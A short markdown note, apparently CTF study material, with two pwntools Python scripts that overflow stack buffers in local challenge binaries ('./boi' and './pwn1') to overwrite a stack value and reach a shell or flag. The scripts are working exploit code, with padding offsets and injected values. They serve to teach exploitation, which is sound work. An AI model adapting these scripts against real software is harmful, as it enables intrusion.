# Overwrite a Stack Value

Examples of simple buffer owverflows to edit a stack value and get a shell or flag  

```python3
#!/usr/bin/env python3
from pwn import *

context.log_level="debug"
io = process("./boi")

offset = b"A" * 20              # Offset to the target value
value = b"\xee\xba\xf3\xca"     # New value to be set
payload = offset + value        # create the payload
io.recv()                       # Run the program and receive lines
io.send(payload)                # Send the payload
io.interactive()                # Interact with the shell
```

```python3
from pwn import *

context.log_level="debug"
io = process("./pwn1")

# What is your name?
io.sendline(b"Sir Lancelot of Camelot")

# What is your quest?

io.sendline(b"To seek the Holy Grail.")

# What is your secret
payload = b"A" * 43 + b"\xc8\x10\xa1\xde"
io.sendline(payload)

# Win
io.recv()
```
